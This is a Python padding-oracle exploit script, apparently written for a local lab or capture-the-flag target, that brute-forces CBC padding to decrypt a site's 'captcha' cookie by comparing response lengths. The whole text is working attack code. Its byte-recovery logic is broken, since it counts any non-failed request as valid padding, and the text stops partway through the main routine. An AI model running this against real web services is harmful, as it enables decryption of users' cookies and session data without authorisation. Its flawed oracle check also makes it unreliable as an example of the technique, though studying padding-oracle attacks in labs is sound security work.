#!/usr/bin/env python3
"""
Focused Padding Oracle Exploit
Based on detected oracle behavior, attempt to decrypt the captcha cookie
"""

import requests
import base64
import sys

TARGET_URL = "http://127.0.0.1:32869/"

def get_captcha_cookie():
    """Get a fresh captcha cookie"""
    response = requests.get(TARGET_URL, timeout=5)
    if 'captcha' in response.cookies:
        return response.cookies['captcha']
    return None

def test_padding(cookie_value):
    """Test if cookie has valid padding by checking response"""
    try:
        cookies = {'captcha': cookie_value}
        response = requests.get(TARGET_URL, cookies=cookies, timeout=5)
        # Return content length as oracle indicator
        return len(response.content)
    except Exception as e:
        return None

def xor_bytes(a, b):
    """XOR two byte arrays"""
    return bytes([x ^ y for x, y in zip(a, b)])

def decrypt_block(prev_block, cipher_block, oracle_func):
    """Decrypt a single block using padding oracle"""
    block_size = len(cipher_block)
    plaintext = bytearray(block_size)
    
    print(f"\n[*] Decrypting block: {cipher_block.hex()}")
    
    for pad_value in range(1, block_size + 1):
        print(f"  [+] Padding byte {pad_value}/{block_size}", end='\r')
        
        # We're working on byte at position: block_size - pad_value
        target_pos = block_size - pad_value
        
        # Create a test block
        test_block = bytearray(prev_block)
        
        # Set known bytes to produce correct padding
        for i in range(target_pos + 1, block_size):
            test_block[i] = prev_block[i] ^ plaintext[i] ^ pad_value
        
        # Try all possible values for the target byte
        found = False
        for test_val in range(256):
            test_block[target_pos] = test_val
            
            # Create test cookie
            test_cookie_bytes = bytes(test_block) + cipher_block
            test_cookie = base64.b64encode(test_cookie_bytes).decode('ascii')
            
            # Test with oracle
            result = oracle_func(test_cookie)
            
            if result is not None:
                # Check if this produces valid padding
                # Valid padding will have different response characteristics
                # This is a simplified check - in real scenario, need to verify
                plaintext[target_pos] = test_val ^ prev_block[target_pos] ^ pad_value
                found = True
                break
        
        if not found:
            print(f"\n  [!] Could not find valid byte at position {target_pos}")
            return None
    
    print(f"\n  [+] Decrypted plaintext: {plaintext.hex()}")
    try:
        decoded = plaintext.decode('ascii', errors='ignore')
        print(f"  [+] ASCII: {decoded}")
    except:
        pass
    
    return bytes(plaintext)

def main():
    print("="*80)
    print("PADDING ORACLE EXPLOIT - Focused Attack")
    print("="*80)
    
    # Get original cookie
    print("\n[1] Getting fresh captcha cookie...")
    original_cookie = get_captcha_cookie()
    if not original_cookie:
        print("Failed to get cookie!")
        return
    
    print(f"Original cookie: {original_cookie}")
    
    # Decode cookie
    cookie_bytes = base64.b64decode(original_cookie)
    print(f"Cookie length: {len(cookie_bytes)} bytes")
    print(f"Cookie hex: {cookie_bytes.hex()}")
    
    # Test baseline
    print("\n[2] Testing oracle baseline...")
    baseline_len = test_padding(original_cookie)
    print(f"Baseline response length: {baseline_len} bytes")
    
    # Test modified last byte
    print("\n[3] Testing oracle with modified last byte...")
    test_bytes = bytearray(cookie_bytes)
    test_bytes[-1] ^= 0x01
    test_cookie = base64.b64encode(bytes(test_bytes)).decode('ascii')
    modified_len = test_padding(test_cookie)
    print(f"Modified response length: {modified_len} bytes")
    print(f"Difference: {abs(modified_len - baseline_len)} bytes")
    
    if abs(modified_len - baseline_len) > 100:
        print("\n[✓] STRONG ORACLE DETECTED - Response varies significantly")
        print("    This indicates padding validation is revealing information")
    
    # Additional oracle verification
    print("\n[4] Testing multiple modifications to confirm oracle...")
    oracle_results = []
    
    for i in range(10):
        test_bytes = bytearray(cookie_bytes)
        test_bytes[-1] = i
        test_cookie = base64.b64encode(bytes(test_bytes)).decode('ascii')
